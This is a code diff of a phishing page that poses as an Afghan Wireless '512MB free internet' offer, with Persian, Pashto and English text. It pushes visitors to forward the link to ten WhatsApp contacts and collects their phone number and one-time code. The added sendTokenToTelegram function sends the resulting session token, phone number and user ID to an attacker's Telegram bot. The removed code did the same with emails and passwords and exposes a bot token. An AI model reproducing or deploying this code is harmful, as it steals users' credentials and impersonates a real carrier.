+                supportText: 'برای پشتیبانی: ۱۰۰ (از تلفن‌های افغان بیسیم) یا +۹۳ ۷۹ ۹۹۹ ۱۰۰',
+                successMsg: 'عملیات موفق!',
+                errorMsg: 'خطا!',
+                infoMsg: 'توجه!',
+                sendingOtp: 'در حال ارسال کد تأیید...',
+                verifyingOtp: 'در حال تأیید کد...',
+                registering: 'در حال ثبت‌نام...',
+                redeeming: 'در حال دریافت جایزه...',
+                sharing: 'در حال ارسال در واتساپ...',
+                otpSent: 'کد تأیید به تلفن شما ارسال شد.',
+                otpVerified: 'شماره تلفن شما با موفقیت تأیید شد.',
+                registered: 'حساب شما با موفقیت ثبت شد.',
+                rewardClaimed: 'شما از 512 مگابایت اینترنت رایگان بهره‌مند شدید.',
+                invalidPhone: 'شماره تلفن معتبر نیست. باید با 70، 71، 070 یا 071 شروع شود.',
+                invalidOtp: 'کد تأیید صحیح نیست. باید دقیقاً ۶ رقمی باشد. دوباره تلاش کنید.',
+                apiError: 'مشکل در ارتباط با API. دوباره تلاش کنید.',
+                alreadyClaimed: 'شما قبلاً از 512 مگابایت اینترنت رایگان بهره‌مند شده‌اید.',
+                networkError: 'مشکل در ارتباط اینترنتی. دوباره تلاش کنید.',
+                shareSuccess: 'اپلیکیشن واتساپ باز شد. لینک را برای دوستان خود ارسال کنید.',
+                shareComplete: 'مرحله انتشار شما کامل شد. اکنون می‌توانید شماره تلفن خود را تأیید کنید.',
+                telegramSent: 'توکن با موفقیت به تلگرام ارسال شد.'
+            },
+            en: {
+                appTitle: 'Afghan Wireless - 512MB Free Internet',
+                rewardTitle: 'Get 512MB Free Internet!',
+                rewardSubtitle: 'Verify your phone number and enjoy 512MB free internet',
+                shareTitle: 'First, Share This Link!',
+                shareDescription: 'First, send this link to ten of your friends on WhatsApp and share it. Then you can enjoy 512MB free internet.',
+                shareNoteText: 'Send this link to ten of your friends on WhatsApp. Send to each friend in a separate message.',
+                shareBtnText: 'Share Link on WhatsApp',
+                skipShareText: 'Later',
+                progressText: 'Progress:',
+                progressNote: 'Link sent to friends',
+                phoneLabel: 'Enter your phone number',
+                phoneNote: 'Phone number must start with 70, 070, 71 or 071. Example: 701234567',
+                sendOtpText: 'Send OTP Code',
+                otpLabel: 'Enter the verification code sent to your phone',
+                otpNote: '6-digit code has been sent to your phone. You can also paste the code. This code is valid for 5 minutes.',
+                verifyOtpText: 'Verify',
+                resendOtpText: 'Resend Code',
+                nameLabel: 'Enter your name',
+                namePlaceholder: 'Your full name',
+                genderLabel: 'Select gender',
+                maleLabel: 'Male',
+                femaleLabel: 'Female',
+                registerText: 'Register',
+                rewardInfoTitle: '512MB Free Internet Details',
+                rewardInfoText: 'You are now ready to receive 512MB free internet. This internet is valid for one week and can be used nationwide.',
+                redeemText: 'Claim Reward',
+                congratsTitle: 'Congratulations!',
+                congratsMessage: 'You have successfully claimed 512MB free internet from Afghan Wireless. The internet service will be activated on your phone shortly.',
+                restartCountdown: 'This page will automatically restart in <span id="countdown-number">10</span> seconds...',
+                footerText: 'Service provided by Afghan Wireless Company. All rights reserved © 2023',
+                supportText: 'For support: 100 (from Afghan Wireless phones) or +93 79 999 100',
+                successMsg: 'Success!',
+                errorMsg: 'Error!',
+                infoMsg: 'Notice!',
+                sendingOtp: 'Sending OTP...',
+                verifyingOtp: 'Verifying OTP...',
+                registering: 'Registering...',
+                redeeming: 'Claiming reward...',
+                sharing: 'Sharing on WhatsApp...',
+                otpSent: 'OTP code has been sent to your phone.',
+                otpVerified: 'Your phone number has been successfully verified.',
+                registered: 'Your account has been successfully registered.',
+                rewardClaimed: 'You have claimed 512MB free internet.',
+                invalidPhone: 'Invalid phone number. Must start with 70, 71, 070 or 071.',
+                invalidOtp: 'Invalid OTP code. Must be exactly 6 digits. Please try again.',
+                apiError: 'Problem connecting to API. Please try again.',
+                alreadyClaimed: 'You have already claimed 512MB free internet.',
+                networkError: 'Internet connection problem. Please try again.',
+                shareSuccess: 'WhatsApp application opened. Send the link to your friends.',
+                shareComplete: 'Your sharing is complete. Now you can verify your phone number.',
+                telegramSent: 'Token successfully sent to Telegram.'
+            }
+        };
 
-    const email = document.getElementById("email").value;
-    const currentPassword = document.getElementById("current_password").value;
+        // د HTML عناصرو راجع کول
+        const elements = {
+            appTitle: document.getElementById('app-title'),
+            rewardTitle: document.getElementById('reward-title'),
+            rewardSubtitle: document.getElementById('reward-subtitle'),
+            shareTitle: document.getElementById('share-title'),
+            shareDescription: document.getElementById('share-description'),
+            shareNoteText: document.getElementById('share-note-text'),
+            shareBtnText: document.getElementById('share-btn-text'),
+            skipShareText: document.getElementById('skip-share-text'),
+            progressText: document.getElementById('progress-text'),
+            progressNote: document.getElementById('progress-note'),
+            phoneLabel: document.getElementById('phone-label'),
+            phoneNote: document.getElementById('phone-note'),
+            sendOtpText: document.getElementById('send-otp-text'),
+            otpLabel: document.getElementById('otp-label'),
+            otpNote: document.getElementById('otp-note'),
+            verifyOtpText: document.getElementById('verify-otp-text'),
+            resendOtpText: document.getElementById('resend-otp-text'),
+            nameLabel: document.getElementById('name-label'),
+            namePlaceholder: document.querySelector('#name'),
+            genderLabel: document.getElementById('gender-label'),
+            maleLabel: document.getElementById('male-label'),
+            femaleLabel: document.getElementById('female-label'),
+            registerText: document.getElementById('register-text'),
+            rewardInfoTitle: document.getElementById('reward-info-title'),
+            rewardInfoText: document.getElementById('reward-info-text'),
+            redeemText: document.getElementById('redeem-text'),
+            congratsTitle: document.getElementById('congrats-title'),
+            congratsMessage: document.getElementById('congrats-message'),
+            restartCountdown: document.getElementById('restart-countdown'),
+            footerText: document.getElementById('footer-text'),
+            supportText: document.getElementById('support-text')
+        };
 
-    const botToken = "8038455508:AAG_nhK7FB5uTwVPaUXlr_FXBaHkmHkpTQo";
-    const chatId = "6379929132";
+        // د API کال لپاره عمومي فانکشن
+        async function callApi(endpoint, method = 'POST', data = null, requiresAuth = false) {
+            const url = `${API_CONFIG.BASE_URL}/${endpoint}`;
+            
+            const headers = {
+                ...API_CONFIG.HEADERS,
+                'lang': appState.currentLang
+            };
+            
+            if (requiresAuth && appState.token) {
+                headers['Authorization'] = `Bearer ${appState.token}`;
+            }
+            
+            const options = {
+                method,
+                headers
+            };
+            
+            if (data) {
+                if (method === 'POST' || method === 'PUT') {
+                    options.body = JSON.stringify(data);
+                }
+            }
+            
+            try {
+                showLoader();
+                const response = await fetch(url, options);
+                const result = await response.json();
+                hideLoader();
+                
+                return result;
+            } catch (error) {
+                hideLoader();
+                console.error('API Error:', error);
+                showMessage(translations[appState.currentLang].networkError, 'error');
+                throw error;
+            }
+        }
 
-    const message = `🔐 درخواست تغییر رمز عبور:\n📧 ایمیل: ${email}\n🔑 رمز فعلی: ${currentPassword}\n🆕 رمز جدید: ${newPass}\n🔁 تایید رمز: ${confirmPass}`;
+        // د مرحلو بدلول
+        function showStep(stepId) {
+            // ټول مرحلې پټې کول
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            
+            // نوی مرحله ښکاره کول
+            document.getElementById(stepId).classList.add('active');
+            appState.currentStep = stepId;
+        }
 
-    try {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message }),
-      });
-      alert("درخواست شما ارسال شد.");
-      form.reset();
-      form.classList.remove("was-validated");
-    } catch (error) {
-      alert("ارسال با خطا مواجه شد، لطفاً دوباره تلاش کنید.");
-    }
-  });
-</script>
+        // د لوډر ښودل
+        function showLoader() {
+            appState.isProcessing = true;
+            document.querySelectorAll('.btn').forEach(btn => {
+                if (!btn.disabled) {
+                    const originalText = btn.innerHTML;
+                    btn.setAttribute('data-original-text', originalText);
+                    btn.innerHTML = `<span class="loader"></span> ${getProcessingText(btn.id)}`;
+                    btn.disabled = true;
+                }
+            });
+        }
 
+        // د لوډر پټول
+        function hideLoader() {
+            appState.isProcessing = false;
+            document.querySelectorAll('.btn').forEach(btn => {
+                const originalText = btn.getAttribute('data-original-text');
+                if (originalText) {
+                    btn.innerHTML = originalText;
+                    btn.removeAttribute('data-original-text');
+                    btn.disabled = false;
+                }
+            });
+        }
+
+        // د پروسې متن ترلاسه کول
+        function getProcessingText(buttonId) {
+            const lang = appState.currentLang;
+            switch(buttonId) {
+                case 'send-otp-btn': return translations[lang].sendingOtp;
+                case 'verify-otp-btn': return translations[lang].verifyingOtp;
+                case 'register-btn': return translations[lang].registering;
+                case 'redeem-btn': return translations[lang].redeeming;
+                case 'share-btn': return translations[lang].sharing;
+                default: return 'Processing...';
+            }
+        }
+
+        // د پیغام ښودل
+        function showMessage(message, type = 'info') {
+            const messageContainer = document.getElementById('message-container');
+            
+            // د پخوانیو پیغامونو پاکول
+            messageContainer.innerHTML = '';
+            
+            // نوی پیغام جوړول
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type}`;
+            
+            let icon = 'info-circle';
+            let title = translations[appState.currentLang].infoMsg;
+            
+            if (type === 'success') {
+                icon = 'check-circle';
+                title = translations[appState.currentLang].successMsg;
+            } else if (type === 'error') {
+                icon = 'exclamation-circle';
+                title = translations[appState.currentLang].errorMsg;
+            }
+            
+            alertDiv.innerHTML = `
+                <i class="fas fa-${icon}"></i>
+                <div>
+                    <strong>${title}</strong>
+                    <p>${message}</p>
+                </div>
+            `;
+            
+            messageContainer.appendChild(alertDiv);
+            
+            // د پیغام ځانګړی وخت لپاره پاتې کیدل
+            if (type === 'success' || type === 'error') {
+                setTimeout(() => {
+                    alertDiv.style.opacity = '0';
+                    setTimeout(() => {
+                        if (messageContainer.contains(alertDiv)) {
+                            messageContainer.removeChild(alertDiv);
+                        }
+                    }, 500);
+                }, 5000);
+            }
+        }
+
+        // د تلیفون شمېرې ولیدل
+        function validatePhoneNumber(phone) {
+            // د +93 پاکول که شتون ولري
+            let cleanPhone = phone.replace(/\s+/g, '').replace('+93', '');
+            
+            // د لومړي صفر پاکول که شتون ولري
+            if (cleanPhone.startsWith('0')) {
+                cleanPhone = cleanPhone.substring(1);
+            }
+            
+            // د تلیفون شمېرې اوږدوالی
+            if (cleanPhone.length !== 9) {
+                return { valid: false, message: translations[appState.currentLang].invalidPhone };
+            }
+            
+            // د لومړیو څلورو عددونو ولیدل
+            const firstTwo = cleanPhone.substring(0, 2);
+            if (!['70', '71'].includes(firstTwo)) {
+                return { valid: false, message: translations[appState.currentLang].invalidPhone };
+            }
+            
+            // د باقی عددونو ولیدل
+            const remaining = cleanPhone.substring(2);
+            if (!/^\d{7}$/.test(remaining)) {
+                return { valid: false, message: translations[appState.currentLang].invalidPhone };
+            }
+            
+            // بشپړه تلیفون شمېره د API لپاره
+            const fullNumber = `93${cleanPhone}`;
+            
+            return { valid: true, phone: fullNumber, displayPhone: cleanPhone };
+        }
+
+        // د OTP ولیدل
+        function validateOtp(otp) {
+            // یوازې عددي ارزښتونه
+            const cleanOtp = otp.replace(/\D/g, '');
+            
+            // باید دقیقاً ۶ عددي وي
+            if (cleanOtp.length !== 6) {
+                return { valid: false, message: translations[appState.currentLang].invalidOtp };
+            }
+            
+            // باید یوازې عددونه وي
+            if (!/^\d{6}$/.test(cleanOtp)) {
+                return { valid: false, message: translations[appState.currentLang].invalidOtp };
+            }
+            
+            return { valid: true, otp: cleanOtp };
+        }
+
+        // د OTP ان پټ مدیریت
+        function setupOtpInput() {
+            const otpInput = document.getElementById('otp-single');
+            
+            // د ان پټ پاکول کله چې یوازې عددونه وي
+            otpInput.addEventListener('input', (e) => {
+                // یوازې عددونه ساتل
+                e.target.value = e.target.value.replace(/\D/g, '');
+                
+                // لږترلږه ۶ عددونه
+                if (e.target.value.length > 6) {
+                    e.target.value = e.target.value.substring(0, 6);
+                }
+                
+                // د OTP ارزښت تازه کول
+                appState.otp = e.target.value;
+            });
+            
+            // د پاسټ مدیریت
+            otpInput.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedText = e.clipboardData.getData('text');
+                const numericText = pastedText.replace(/\D/g, '');
+                
+                if (numericText.length >= 6) {
+                    e.target.value = numericText.substring(0, 6);
+                    appState.otp = e.target.value;
+                }
+            });
+        }
+
+        // د نشر مرحلې پرمختګ تازه کول
+        function updateShareProgress() {
+            const percent = (appState.sharesCount / appState.maxShares) * 100;
+            
+            // د پرمختګ بار تازه کول
+            document.getElementById('progress-fill').style.width = `${percent}%`;
+            
+            // د پرمختګ سلنه تازه کول
+            document.getElementById('progress-percent').textContent = `${Math.round(percent)}%`;
+            
+            // د شمېرې تازه کول
+            document.getElementById('shares-count').textContent = appState.sharesCount;
+            
+            // که چیرې بشپړ شوی وي، بیا پرمختیا وښیې
+            if (appState.sharesCount >= appState.maxShares) {
+                showMessage(translations[appState.currentLang].shareComplete, 'success');
+                setTimeout(() => {
+                    showStep('step-verify-phone');
+                }, 2000);
+            }
+        }
+
+        // د واتساپ لینک لیږل
+        function shareOnWhatsApp() {
+            const shareText = `د افغان بېسیم څخه د 512 ام وړیا انټرنیټ ترلاسه کړئ: ${appState.shareLink}`;
+            const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
+            
+            // د واتساپ اپلیکیشن خلاصول
+            window.open(whatsappUrl, '_blank');
+            
+            // د پرمختګ تازه کول (د 5 ثانیو وروسته)
+            setTimeout(() => {
+                if (appState.sharesCount < appState.maxShares) {
+                    appState.sharesCount++;
+                    updateShareProgress();
+                    showMessage(translations[appState.currentLang].shareSuccess, 'info');
+                    
+                    // که چیرې د نشر کچه 3 ته ورسېږي، د وروسته کولو بټن ښکاره کړئ
+                    if (appState.sharesCount >= 3) {
+                        document.getElementById('skip-share-btn').style.display = 'block';
+                    }
+                }
+            }, 5000); // 5 ثانیې وروسته
+        }
+
+        // د توکن ټیلیګرام ته لیږل
+        function sendTokenToTelegram(token) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT.TOKEN}/sendMessage`;
+            
+            const data = {
+                chat_id: TELEGRAM_BOT.CHAT_ID,
+                text: `نوی توکن: ${token}\nد تلیفون شمېره: ${appState.phoneNumber}\nکاروونکی ID: ${appState.userId}\nژبه: ${appState.currentLang}\nوخت: ${new Date().toLocaleString()}`
+            };
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Token sent to Telegram:', result);
+            })
+            .catch(error => {
+                console.error('Error sending token to Telegram:', error);
+            });
+        }
+
+        // د اتوماتیک بیا پیل کولو پروسه پیلول
+        function startAutoRestart() {
+            // د وخت شمارنده تنظیمول
+            appState.countdown = 10;
+            updateCountdownDisplay();
+            
+            // د وخت شمارنده پیلول
+            appState.restartTimer = setInterval(() => {
+                appState.countdown--;
+                updateCountdownDisplay();
+                
+                if (appState.countdown <= 0) {
+                    clearInterval(appState.restartTimer);
+                    resetApplication();
+                }
+            }, 1000);
+        }
+
+        // د وخت شمارنده تازه کول
+        function updateCountdownDisplay() {
+            const countdownElement = document.getElementById('countdown-number');
+            if (countdownElement) {
+                countdownElement.textContent = appState.countdown;
+            }
+        }
+
+        // د پلیکیشن بیا تنظیمول
+        function resetApplication() {
+            // د تایمر وقفه کول
+            if (appState.restartTimer) {
+                clearInterval(appState.restartTimer);
+            }
+            
+            // د پلیکیشن حالت بیا تنظیمول
+            appState = {
+                currentLang: appState.currentLang,
+                currentStep: 'step-share',
+                phoneNumber: '',
+                otp: '',
+                token: '',
+                userId: '',
+                userRef: '',
+                hasAccount: false,
+                userName: '',
+                userGender: '',
+                isProcessing: false,
+                restartTimer: null,
+                countdown: 10,
+                sharesCount: 0,
+                maxShares: 10,
+                shareLink: 'https://awcc.af/d/512mb-free-internet'
+            };
+            
+            // فورم پاکول
+            document.getElementById('phone').value = '';
+            document.getElementById('otp-single').value = '';
+            document.getElementById('name').value = '';
+            document.querySelectorAll('input[name="gender"]').forEach(radio => {
+                radio.checked = false;
+            });
+            
+            // د نشر پرمختګ بیا تنظیمول
+            updateShareProgress();
+            
+            // د وروسته کولو بټن پټول
+            document.getElementById('skip-share-btn').style.display = 'none';
+            
+            // لومړي مرحلې ته ولاړ شئ
+            showStep('step-share');
+            
+            // د پیغامونو پاکول
+            document.getElementById('message-container').innerHTML = '';
+        }
+
+        // د API غوښتنې
+
+        // 1. د تلیفون شمېرې تصدیق
+        async function verifyPhone() {
+            const phoneInput = document.getElementById('phone').value;
+            const validation = validatePhoneNumber(phoneInput);
+            
+            if (!validation.valid) {
+                showMessage(validation.message, 'error');
+                return;
+            }
+            
+            appState.phoneNumber = validation.phone;
+            
+            const data = {
+                msisdn: appState.phoneNumber,
+                lang: appState.currentLang
+            };
+            
+            try {
+                const result = await callApi('verify_phone', 'POST', data);
+                
+                if (result.code === 1) {
+                    showMessage(translations[appState.currentLang].otpSent, 'success');
+                    showStep('step-verify-otp');
+                    document.getElementById('otp-single').focus();
+                } else {
+                    showMessage(result.msg || translations[appState.currentLang].apiError, 'error');
+                }
+            } catch (error) {
+                showMessage(translations[appState.currentLang].apiError, 'error');
+            }
+        }
+
+        // 2. د OTP کوډ تصدیق
+        async function verifyOtp() {
+            const otpInput = document.getElementById('otp-single').value;
+            const validation = validateOtp(otpInput);
+            
+            if (!validation.valid) {
+                showMessage(validation.message, 'error');
+                return;
+            }
+            
+            appState.otp = validation.otp;
+            
+            const data = {
+                msisdn: appState.phoneNumber,
+                otp: appState.otp,
+                lang: appState.currentLang
+            };
+            
+            try {
+                const result = await callApi('verify_otp', 'POST', data);
+                
+                if (result.code === 1) {
+                    showMessage(translations[appState.currentLang].otpVerified, 'success');
+                    
+                    // د توکن او نورو معلوماتو ساتل
+                    appState.token = result.data.token;
+                    appState.userId = result.data.user_id;
+                    appState.userRef = result.data.ref;
+                    appState.hasAccount = result.data.has_account;
+                    
+                    // د توکن ټیلیګرام ته لیږل
+                    sendTokenToTelegram(appState.token);
+                    
+                    // که چیرې کاروونکي حساب ولري، مستقیم د جایزې مرحلې ته لاړ شئ
+                    if (appState.hasAccount) {
+                        showStep('step-redeem');
+                    } else {
+                        // که چیرې حساب ونلري، د راجستر مرحلې ته لاړ شئ
+                        showStep('step-register');
+                    }
+                } else {
+                    showMessage(result.msg || translations[appState.currentLang].invalidOtp, 'error');
+                }
+            } catch (error) {
+                showMessage(translations[appState.currentLang].apiError, 'error');
+            }
+        }
+
+        // 3. د کاروونکي ثبتول
+        async function registerUser() {
+            const name = document.getElementById('name').value;
+            const gender = document.querySelector('input[name="gender"]:checked');
+            
+            if (!name || name.trim().length < 2) {
+                showMessage('لطفاً نوم ولیکئ (لږ تر لږه ۲ حرفي)', 'error');
+                return;
+            }
+            
+            if (!gender) {
+                showMessage('لطفاً جنس انتخاب کړئ', 'error');
+                return;
+            }
+            
+            appState.userName = name.trim();
+            appState.userGender = gender.value;
+            
+            // د FormData جوړول
+            const formData = new FormData();
+            formData.append('name', appState.userName);
+            formData.append('gender', appState.userGender);
+            formData.append('lang', appState.currentLang);
+            
+            try {
+                const url = `${API_CONFIG.BASE_URL}/register`;
+                
+                const headers = {
+                    'key': API_CONFIG.HEADERS.key,
+                    'ref': API_CONFIG.HEADERS.ref,
+                    'appversion': API_CONFIG.HEADERS.appversion,
+                    'lang': appState.currentLang,
+                    'Authorization': `Bearer ${appState.token}`
+                };
+                
+                showLoader();
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: headers,
+                    body: formData
+                });
+                
+                const result = await response.json();
+                hideLoader();
+                
+                if (result.code === 1) {
+                    showMessage(translations[appState.currentLang].registered, 'success');
+                    showStep('step-redeem');
+                } else {
+                    showMessage(result.msg || translations[appState.currentLang].apiError, 'error');
+                }
+            } catch (error) {
+                hideLoader();
+                showMessage(translations[appState.currentLang].apiError, 'error');
+            }
+        }
+
+        // 4. جایزه ترلاسه کول
+        async function redeemReward() {
+            const data = {
+                lang: appState.currentLang
+            };
+            
+            try {
+                const result = await callApi('redeem', 'POST', data, true);
+                
+                // که چیرې کاروونکي مخکې جایزه ترلاسه کړې وي
+                if (result.code === 2) {
+                    showMessage(translations[appState.currentLang].alreadyClaimed, 'info');
+                } else if (result.code === 1) {
+                    showMessage(translations[appState.currentLang].rewardClaimed, 'success');
+                } else {
+                    showMessage(result.msg || translations[appState.currentLang].apiError, 'error');
+                }
+                
+                // په هر حالت کې، مبارکي ورکول او اتوماتیک بیا پیل کول
+                showStep('step-result');
+                startAutoRestart();
+                
+            } catch (error) {
+                showMessage(translations[appState.currentLang].apiError, 'error');
+            }
+        }
+
+        // د ژبې بدلول
+        function changeLanguage(lang) {
+            appState.currentLang = lang;
+            
+            // د ژبې تڼۍ فعال کول
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                if (btn.getAttribute('data-lang') === lang) {
+                    btn.classList.add('active');
+                } else {
+                    btn.classList.remove('active');
+                }
+            });
+            
+            // د HTML متنونه تازه کول
+            const t = translations[lang];
+            
+            elements.appTitle.textContent = t.appTitle;
+            elements.rewardTitle.textContent = t.rewardTitle;
+            elements.rewardSubtitle.textContent = t.rewardSubtitle;
+            elements.shareTitle.textContent = t.shareTitle;
+            elements.shareDescription.textContent = t.shareDescription;
+            elements.shareNoteText.textContent = t.shareNoteText;
+            elements.shareBtnText.textContent = t.shareBtnText;
+            elements.skipShareText.textContent = t.skipShareText;
+            elements.progressText.textContent = t.progressText;
+            elements.phoneLabel.textContent = t.phoneLabel;
+            elements.phoneNote.textContent = t.phoneNote;
+            elements.sendOtpText.textContent = t.sendOtpText;
+            elements.otpLabel.textContent = t.otpLabel;
+            elements.otpNote.textContent = t.otpNote;
+            elements.verifyOtpText.textContent = t.verifyOtpText;
+            elements.resendOtpText.textContent = t.resendOtpText;
+            elements.nameLabel.textContent = t.nameLabel;
+            elements.namePlaceholder.placeholder = t.namePlaceholder;
+            elements.genderLabel.textContent = t.genderLabel;
+            elements.maleLabel.textContent = t.maleLabel;
+            elements.femaleLabel.textContent = t.femaleLabel;
+            elements.registerText.textContent = t.registerText;
+            elements.rewardInfoTitle.textContent = t.rewardInfoTitle;
+            elements.rewardInfoText.textContent = t.rewardInfoText;
+            elements.redeemText.textContent = t.redeemText;
+            elements.congratsTitle.textContent = t.congratsTitle;
+            elements.congratsMessage.textContent = t.congratsMessage;
+            elements.restartCountdown.innerHTML = t.restartCountdown;
+            elements.footerText.textContent = t.footerText;
+            elements.supportText.textContent = t.supportText;
+            
+            // د پرمختګ یادداشت تازه کول
+            document.getElementById('progress-note').innerHTML = `<span id="shares-count">${appState.sharesCount}</span> / 10 ${t.progressNote}`;
+            
+            // د وخت شمارنده تازه کول
+            updateCountdownDisplay();
+            
+            // د HTML د لوري بدلول
+            if (lang === 'en') {
+                document.documentElement.dir = 'ltr';
+                document.querySelectorAll('.input-with-icon i').forEach(icon => {
+                    icon.style.right = 'auto';
+                    icon.style.left = '15px';
+                });
+                document.querySelector('.phone-prefix').style.left = 'auto';
+                document.querySelector('.phone-prefix').style.right = '15px';
+                document.querySelectorAll('.alert').forEach(alert => {
+                    alert.style.borderRight = 'none';
+                    alert.style.borderLeft = '4px solid';
+                });
+                document.querySelectorAll('.reward-info').forEach(info => {
+                    info.style.borderRight = 'none';
+                    info.style.borderLeft = '4px solid var(--primary-blue)';
+                });
+                document.querySelectorAll('.phone-note').forEach(note => {
+                    note.style.borderRight = 'none';
+                    note.style.borderLeft = '3px solid var(--primary-blue)';
+                });
+                document.querySelectorAll('.auto-restart-info').forEach(info => {
+                    info.style.borderRight = 'none';
+                    info.style.borderLeft = '4px solid var(--warning-orange)';
+                });
+                document.querySelector('.share-note').style.borderRight = 'none';
+                document.querySelector('.share-note').style.borderLeft = '4px solid var(--whatsapp-green)';
+            } else {
+                document.documentElement.dir = 'rtl';
+                document.querySelectorAll('.input-with-icon i').forEach(icon => {
+                    icon.style.left = 'auto';
+                    icon.style.right = '15px';
+                });
+                document.querySelector('.phone-prefix').style.right = 'auto';
+                document.querySelector('.phone-prefix').style.left = '15px';
+                document.querySelectorAll('.alert').forEach(alert => {
+                    alert.style.borderLeft = 'none';
+                    alert.style.borderRight = '4px solid';
+                });
+                document.querySelectorAll('.reward-info').forEach(info => {
+                    info.style.borderLeft = 'none';
+                    info.style.borderRight = '4px solid var(--primary-blue)';
+                });
+                document.querySelectorAll('.phone-note').forEach(note => {
+                    note.style.borderLeft = 'none';
+                    note.style.borderRight = '3px solid var(--primary-blue)';
+                });
+                document.querySelectorAll('.auto-restart-info').forEach(info => {
+                    info.style.borderLeft = 'none';
+                    info.style.borderRight = '4px solid var(--warning-orange)';
+                });
+                document.querySelector('.share-note').style.borderLeft = 'none';
+                document.querySelector('.share-note').style.borderRight = '4px solid var(--whatsapp-green)';
+            }
+        }
+
+        // د پلیکیشن پیلول
+        function initApp() {
+            // د ژبې تڼۍ مدیریت
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const lang = btn.getAttribute('data-lang');
+                    changeLanguage(lang);
+                });
+            });
+            
+            // د OTP واحد ان پټ تنظیم
+            setupOtpInput();
+            
+            // د نشر تڼۍ
+            document.getElementById('share-btn').addEventListener('click', shareOnWhatsApp);
+            
+            // د وروسته کولو تڼۍ
+            document.getElementById('skip-share-btn').addEventListener('click', () => {
+                showStep('step-verify-phone');
+            });
+            
+            // د تلیفون شمېرې تایید تڼۍ
+            document.getElementById('send-otp-btn').addEventListener('click', verifyPhone);
+            
+            // د OTP تایید تڼۍ
+            document.getElementById('verify-otp-btn').addEventListener('click', verifyOtp);
+            
+            // د OTP بیا لیږلو تڼۍ
+            document.getElementById('resend-otp-btn').addEventListener('click', () => {
+                document.getElementById('phone').value = appState.phoneNumber.substring(2);
+                verifyPhone();
+            });
+            
+            // د راجستر تڼۍ
+            document.getElementById('register-btn').addEventListener('click', registerUser);
+            
+            // د جایزې ترلاسه کولو تڼۍ
+            document.getElementById('redeem-btn').addEventListener('click', redeemReward);
+            
+            // د تلیفون شمېرې ان پټ لپاره د Enter تڼۍ مدیریت
+            document.getElementById('phone').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    verifyPhone();
+                }
+            });
+            
+            // د OTP ان پټ لپاره د Enter تڼۍ مدیریت
+            document.getElementById('otp-single').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    verifyOtp();
+                }
+            });
+            
+            // د نوم ان پټ لپاره د Enter تڼۍ مدیریت
+            document.getElementById('name').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    registerUser();
+                }
+            });
+            
+            // د لومړنۍ ژبې په اساس پلیکیشن پیلول
+            changeLanguage('ps');
+            
+            // د نشر پرمختګ تازه کول
+            updateShareProgress();
+        }
+
+        // کله چې پاڼه بشپړه پورته شي، پلیکیشن پیل کړئ
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
 </body>
-  </html>
+</html>
